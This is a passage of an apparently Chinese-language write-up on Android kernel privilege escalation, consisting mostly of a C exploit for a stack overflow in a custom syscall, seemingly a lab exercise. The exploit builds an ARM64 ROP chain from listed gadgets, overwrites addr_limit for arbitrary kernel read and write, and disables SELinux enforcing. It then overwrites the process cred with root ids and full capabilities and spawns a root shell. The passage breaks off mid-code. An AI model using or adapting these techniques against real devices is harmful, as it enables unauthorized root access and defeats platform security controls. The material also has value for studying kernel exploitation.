*)&amp;write_buf[<span class="number">8</span>*<span class="number">19</span>]) = <span class="number">19</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">20</span>]) = <span class="number">20</span>;          <span class="comment">// &lt;-sp</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">21</span>]) = <span class="number">21</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">22</span>]) = real_k_sp;          <span class="comment">// -&gt;x29</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">23</span>]) = KERNEL_RET;          <span class="comment">// -&gt;x30 </span></span><br><span class="line"></span><br><span class="line">    addr_limit_addr = (real_k_sp&amp;<span class="number">0xffffffffffffc000</span>)+<span class="number">0x8</span>;       <span class="comment">// thread_info-&gt;addr_limit</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">26</span>]) = addr_limit_addr - <span class="number">0x38</span>;         <span class="comment">// x9 when control flow hijacked, set it addr_limit-0x38 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    hexdump(write_buf, <span class="number">0x200</span>);</span><br><span class="line">    k_stackof_write(write_buf,<span class="number">0x110</span>);</span><br><span class="line">    <span class="comment">// k_stackof_write(write_buf,0x100);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// write selinux</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> t_data = <span class="number">0</span>;</span><br><span class="line">    write_kernel4((<span class="keyword">void</span>*)selinux_enforcing_addr, &amp;t_data);</span><br><span class="line">    <span class="comment">// printf(&quot;kernel info: %s\n&quot;,strerror(errno));</span></span><br><span class="line">    read_kernel((<span class="keyword">void</span>*)selinux_enforcing_addr, &amp;t_data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;t_data: 0x%lx\n&quot;</span>,t_data);</span><br><span class="line"></span><br><span class="line"><span class="comment">// write cred</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> thread_info_addr = (real_k_sp&amp;<span class="number">0xffffffffffffc000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> task_addr = <span class="number">0</span>;</span><br><span class="line">    read_kernel((<span class="keyword">void</span>*)(thread_info_addr+<span class="number">0x10</span>), &amp;task_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;task_addr: 0x%lx\n&quot;</span>, task_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cred_addr = <span class="number">0</span>;</span><br><span class="line">    read_kernel((<span class="keyword">void</span>*)(task_addr+<span class="number">0x5D8</span>), &amp;cred_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;task_addr: 0x%lx\n&quot;</span>, cred_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> root_id = <span class="number">0</span>;    </span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">4</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">8</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">12</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">16</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">20</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">24</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">28</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">32</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> root_cap = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    write_kernel((<span class="keyword">char</span>*)cred_addr+<span class="number">0x28</span>, (<span class="keyword">char</span>*)&amp;root_cap);</span><br><span class="line">    write_kernel((<span class="keyword">char</span>*)cred_addr+<span class="number">0x30</span>, (<span class="keyword">char</span>*)&amp;root_cap);</span><br><span class="line">    write_kernel((<span class="keyword">char</span>*)cred_addr+<span class="number">0x38</span>, (<span class="keyword">char</span>*)&amp;root_cap);</span><br><span class="line">    write_kernel((<span class="keyword">char</span>*)cred_addr+<span class="number">0x40</span>, (<span class="keyword">char</span>*)&amp;root_cap);</span><br><span class="line">    write_kernel((<span class="keyword">char</span>*)cred_addr+<span class="number">0x48</span>, (<span class="keyword">char</span>*)&amp;root_cap);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get shell\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/system/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;exit\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h2 id="android-9"   >
          <a href="#android-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#android-9" class="headerlink" title="android 9"></a>android 9</h2>
      <blockquote>
<p>内核版本：linux 3.18.94</p>
</blockquote>
<p>利用思路跟android8完全一致，重新找了如下gadget：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget1 = <span class="number">0xffffffc0000a20f8</span>;     <span class="comment">//  : sub sp, x29, #0x10 ; mov w0, #0 ; ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget2 = <span class="number">0xffffffc00016f658</span>;     <span class="comment">//  : mov x0, x9 ; ldp x29, x30, [sp], #0x70 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget3 = <span class="number">0xffffffc0003dc454</span>;     <span class="comment">//  : str x2, [x0, #0x38] ; ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget4 = <span class="number">0xffffffc0000de7a8</span>;     <span class="comment">//  : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x70 ; ret</span></span><br></pre></td></tr></table></div></figure>
<p>本地 root shell</p>
<p><img   src="image-20230906135614067.png?size=600" style="width: 600px;"  alt="image-20230906135614067"></p>
<p>exp如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_STACKOF 601</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_RET 0xFFFFFFC0000BECC8 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> arg1, arg2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> selinux_enforcing_addr = <span class="number">0xFFFFFFC0009C3334</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr_limit_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HEXDUMP_COLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEXDUMP_COLS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">void</span> *mem, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : <span class="number">0</span>); i++) &#123;</span><br><span class="line">        <span class="comment">/* print offset */</span></span><br><span class="line">        <span class="keyword">if</span>(i % HEXDUMP_COLS == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0x%06x: &quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* print hex data */</span></span><br><span class="line">        <span class="keyword">if</span>(i &lt; len) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, <span class="number">0xFF</span> &amp; ((<span class="keyword">char</span>*)mem)[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* end of block, just aligning for ASCII dump */</span></span><br><span class="line">        <span class="keyword">else</span> &#123;        </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* print ASCII dump */</span></span><br><span class="line">        <span class="keyword">if</span>(i % HEXDUMP_COLS == (HEXDUMP_COLS - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i - (HEXDUMP_COLS - <span class="number">1</span>); j &lt;= i; j++) &#123;</span><br><span class="line">                 <span class="comment">/* end of block, not really printing */</span></span><br><span class="line">                <span class="keyword">if</span>(j &gt;= len) &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/* printable char */</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isprint</span>(((<span class="keyword">char</span>*)mem)[j])) &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="number">0xFF</span> &amp; ((<span class="keyword">char</span>*)mem)[j]);</span><br><span class="line">                &#125;</span><br><span class="line">                 <span class="comment">/* other char */</span></span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k_stackof_read(<span class="keyword">void</span>* addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)&#123;</span><br><span class="line">    arg1 = addr;</span><br><span class="line">    arg2 = (len^<span class="number">0xdeadbeefdeadbeef</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;k_stackof_read - arg2: %lx\n&quot;</span>,arg2);</span><br><span class="line">    syscall(SYS_STACKOF, arg1, arg2, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k_stackof_write(<span class="keyword">void</span>* addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)&#123;</span><br><span class="line">    arg1 = addr;</span><br><span class="line">    arg2 = (len^<span class="number">0xdeadbeefdeadbeef</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;k_stackof_write - arg2: %lx\n&quot;</span>,arg2);</span><br><span class="line">    syscall(SYS_STACKOF, arg1, arg2, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget1 = <span class="number">0xffffffc0000a20f8</span>;     <span class="comment">//  : sub sp, x29, #0x10 ; mov w0, #0 ; ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget2 = <span class="number">0xffffffc00016f658</span>;     <span class="comment">//  : mov x0, x9 ; ldp x29, x30, [sp], #0x70 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget3 = <span class="number">0xffffffc0003dc454</span>;     <span class="comment">//  : str x2, [x0, #0x38] ; ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget4 = <span class="number">0xffffffc0000de7a8</span>;     <span class="comment">//  : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x70 ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">char</span>* k_addr, <span class="keyword">char</span>* u_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_rw[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_rw);</span><br><span class="line">    write(pipe_rw[<span class="number">1</span>],(<span class="keyword">void</span>*)k_addr,<span class="number">0x8</span>);</span><br><span class="line">    read(pipe_rw[<span class="number">0</span>],(<span class="keyword">void</span>*)u_addr,<span class="number">0x8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_kernel</span><span class="params">(<span class="keyword">char</span>* k_addr, <span class="keyword">char</span>* u_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_rw[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_rw);</span><br><span class="line">    write(pipe_rw[<span class="number">1</span>],(<span class="keyword">void</span>*)u_addr,<span class="number">0x8</span>);</span><br><span class="line">    read(pipe_rw[<span class="number">0</span>],(<span class="keyword">void</span>*)k_addr,<span class="number">0x8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_kernel4</span><span class="params">(<span class="keyword">char</span>* k_addr, <span class="keyword">char</span>* u_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_rw[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_rw);</span><br><span class="line">    write(pipe_rw[<span class="number">1</span>],(<span class="keyword">void</span>*)u_addr,<span class="number">0x4</span>);</span><br><span class="line">    read(pipe_rw[<span class="number">0</span>],(<span class="keyword">void</span>*)k_addr,<span class="number">0x4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* read_buf = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">char</span>* write_buf = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">memset</span>(read_buf, <span class="number">0x0</span>, <span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">memset</span>(write_buf, <span class="number">0x43</span>, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// char* test_str = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac&quot;;</span></span><br><span class="line">    <span class="comment">// strncpy(write_buf, test_str, 0x100);</span></span><br><span class="line"></span><br><span class="line">    k_stackof_read(read_buf, <span class="number">0x200</span>);</span><br><span class="line">    hexdump(read_buf, <span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> real_k_sp = *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x100</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;real_k_sp: 0x%lx\n&quot;</span>,real_k_sp);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">0x100</span>]) = real_k_sp - <span class="number">0x110</span>;         <span class="comment">// kernel rop, fake kernel sp</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">0x108</span>]) = gadget1;         <span class="comment">// gadget</span></span><br><span class="line">    </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">0</span>]) = <span class="number">0x0</span>;          <span class="comment">// -&gt;x29</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">1</span>]) = gadget2;      <span class="comment">// -&gt;x30</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">2</span>]) = <span class="number">2</span>;            <span class="comment">// &lt;-sp  -&gt;x29  </span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">3</span>]) = gadget3;      <span class="comment">// -&gt;x30</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">4</span>]) = <span class="number">4</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">5</span>]) = <span class="number">5</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">6</span>]) = <span class="number">6</span>;   </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">7</span>]) = <span class="number">7</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">8</span>]) = <span class="number">8</span>;       </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">9</span>]) = <span class="number">9</span>;    </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">10</span>]) = <span class="number">10</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">11</span>]) = <span class="number">11</span>;   </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">12</span>]) = <span class="number">12</span>;   </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">13</span>]) = <span class="number">13</span>;    </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">14</span>]) = <span class="number">14</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">15</span>]) = <span class="number">15</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">16</span>]) = <span class="number">16</span>;          <span class="comment">// &lt;-sp  -&gt;x29</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">17</span>]) = gadget4;     <span class="comment">// -&gt;x30  </span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">18</span>]) = <span class="number">18</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">19</span>]) = <span class="number">19</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">20</span>]) = <span class="number">20</span>;          <span class="comment">// &lt;-sp</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">21</span>]) = <span class="number">21</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">22</span>]) = real_k_sp;          <span class="comment">// -&gt;x29</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">23</span>]) = KERNEL_RET;          <span class="comment">// -&gt;x30 </span></span><br><span class="line"></span><br><span class="line">    addr_limit_addr = (real_k_sp&amp;<span class="number">0xffffffffffffc000</span>)+<span class="number">0x8</span>;       <span class="comment">// thread_info-&gt;addr_limit</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">26</span>]) = addr_limit_addr - <span class="number">0x38</span>;         <span class="comment">// x9 when control flow hijacked, set it addr_limit-0x38 </span></span><br><span class="line"></span><br><span class="line">    hexdump(write_buf, <span class="number">0x200</span>);</span><br><span class="line">    k_stackof_write(write_buf,<span class="number">0x110</span>);</span><br><span class="line">    <span class="comment">// k_stackof_write(write_buf,0x100);  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// write selinux</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> t_data = <span class="number">0</span>;</span><br><span class="line">    write_kernel4((<span class="keyword">void</span>*)selinux_enforcing_addr, &amp;t_data);</span><br><span class="line">    <span class="comment">// printf(&quot;kernel info: %s\n&quot;,strerror(errno));</span></span><br><span class="line">    read_kernel((<span class="keyword">void</span>*)selinux_enforcing_addr, &amp;t_data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;selinux_enforcing : 0x%lx\n&quot;</span>,t_data);</span><br><span class="line"></span><br><span class="line"><span class="comment">// write cred</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> thread_info_addr = (real_k_sp&amp;<span class="number">0xffffffffffffc000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> task_addr = <span class="number">0</span>;</span><br><span class="line">    read_kernel((<span class="keyword">void</span>*)(thread_info_addr+<span class="number">0x10</span>), &amp;task_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;task_addr: 0x%lx\n&quot;</span>, task_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span 